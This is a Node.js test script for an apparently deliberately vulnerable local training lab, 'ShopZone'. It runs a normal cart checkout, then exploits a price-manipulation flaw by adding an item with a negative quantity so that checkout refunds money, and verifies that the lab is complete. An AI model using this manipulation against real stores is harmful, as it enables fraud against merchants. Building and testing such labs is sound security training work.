const http = require('http');

function makeRequest(options, postData) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          data: data
        });
      });
    });

    req.on('error', (e) => reject(e));

    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

function extractCookie(headers) {
  const setCookie = headers['set-cookie'];
  if (!setCookie) return null;
  return setCookie[0].split(';')[0];
}

async function runTest() {
  console.log('--- Testing ShopZone Lab ---');
  let sessionCookie = null;

  try {
    // 1. Initial Request to get session cookie
    console.log('[*] Accessing shopzone homepage...');
    let res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/',
    });
    sessionCookie = extractCookie(res.headers);
    console.log(`[+] Session Cookie: ${sessionCookie}`);

    // 2. Normal Workflow: Add item normally
    console.log('[*] Normal Workflow: Adding ProBook X14 to cart...');
    let postData = 'id=102&name=ProBook+X14&price=1299&quantity=1';
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/cart/add',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'Cookie': sessionCookie
      }
    }, postData);
    console.log(`[+] Normal Add to Cart Status: ${res.statusCode}`);

    // Checkout
    console.log('[*] Normal Workflow: Checkout...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/checkout',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Normal Checkout Status: ${res.statusCode}`);

    // 3. Manipulated Workflow: Negative quantity
    console.log('[*] Manipulated Workflow: Adding item with negative quantity to increase balance...');
    postData = 'id=101&name=Noise-Cancelling+Headphones&price=150&quantity=-20'; // -3000 total
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/cart/add',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'Cookie': sessionCookie
      }
    }, postData);
    console.log(`[+] Manipulated Add to Cart Status: ${res.statusCode}`);

    console.log('[*] Manipulated Workflow: Checkout to apply refund...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/checkout',
      method: 'POST',
      headers: {
        'Cookie': sessionCookie
      }
    });
    console.log(`[+] Manipulated Checkout Status: ${res.statusCode}`);

    // 4. Verify Lab Completion
    console.log('[*] Verifying Lab Completion...');
    res = await makeRequest({
      hostname: 'localhost',
      port: 3000,
      path: '/labs/shopzone/',
      method: 'GET',
      headers: {
        'Cookie': sessionCookie
      }
    });

    if (res.data.includes('Lab Completed!') || res.data.includes('Order Confirmed (Lab Completed!)')) {
      console.log('[+] SUCCESS: Lab completion verified!');
    } else {
      console.log('[-] FAILURE: Lab did not complete.');
      process.exit(1);
    }

  } catch (err) {
    console.error('Error during test:', err.message);
  }
}

runTest();
